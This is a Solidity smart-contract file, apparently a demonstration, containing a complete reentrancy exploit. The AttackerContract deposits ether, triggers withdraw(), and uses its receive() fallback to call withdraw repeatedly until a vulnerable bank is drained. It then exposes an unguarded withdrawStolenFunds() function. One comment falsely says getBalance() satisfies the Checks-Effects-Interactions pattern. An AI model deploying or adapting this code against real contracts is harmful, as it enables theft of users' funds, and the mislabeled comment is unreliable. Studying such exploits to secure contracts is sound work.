// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title IVulnerableBank - Interface for the VulnerableBank contract
interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/// @title AttackerContract - A contract designed to exploit the VulnerableBank
/// @notice This contract demonstrates a reentrancy attack on a vulnerable contract
/// @custom:security-contact
contract AttackerContract {
    IVulnerableBank public vulnerableBank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    /// @notice Initializes the AttackerContract with the address of the vulnerable bank
    /// @param _vulnerableBankAddress The address of the VulnerableBank contract
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = IVulnerableBank(_vulnerableBankAddress);
    }

    /// @notice Initiates the attack on the vulnerable contract
    /// @dev This function deposits and then immediately withdraws to trigger the reentrancy
    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ether to attack");
        vulnerableBank.deposit{value: ATTACK_AMOUNT}();
        vulnerableBank.withdraw(ATTACK_AMOUNT);
    }

    /// @notice Fallback function to handle the reentrancy
    /// @dev This function is called when Ether is sent to the contract, continuing the withdrawal loop
    receive() external payable {
        if (address(vulnerableBank).balance >= ATTACK_AMOUNT) {
            vulnerableBank.withdraw(ATTACK_AMOUNT);
        }
    }

    /// @notice Allows the attacker to withdraw the stolen funds
    /// @dev Transfers all the balance of this contract to the caller
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    /// @dev This function is added to satisfy the Checks-Effects-Interactions pattern
    /// @notice Gets the balance of this contract
    /// @return The current balance of the AttackerContract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}